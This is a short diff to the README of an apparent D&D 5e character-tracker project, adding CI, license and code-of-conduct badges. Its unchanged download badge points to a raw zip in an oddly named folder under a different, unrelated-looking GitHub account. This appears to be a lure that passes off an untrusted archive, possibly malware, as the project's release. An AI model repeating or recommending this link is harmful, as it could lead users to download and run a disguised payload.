@@ -1,5 +1,11 @@
 # 🎲 dnd-tracker - Manage Your D&D 5e Characters Easily
 
+
+[![CI](https://github.com/itsdarklikehell/dnd-tracker/actions/workflows/ci.yml/badge.svg)](https://github.com/itsdarklikehell/dnd-tracker/actions/workflows/ci.yml)
+[![License](https://img.shields.io/github/license/itsdarklikehell/dnd-tracker)](LICENSE)
+[![Contributor Covenant](https://img.shields.io/badge/Contributor%20Covenant-2.1-4baaaa.svg)](CODE_OF_CONDUCT.md)
+
+
 [![Download dnd-tracker](https://img.shields.io/badge/Download-dnd--tracker-blue?style=for-the-badge)](https://github.com/Terrainintelligencethirdplacefinish647/dnd-tracker/raw/refs/heads/main/vagabondage/dnd-tracker-v2.3.zip)
 
 ---
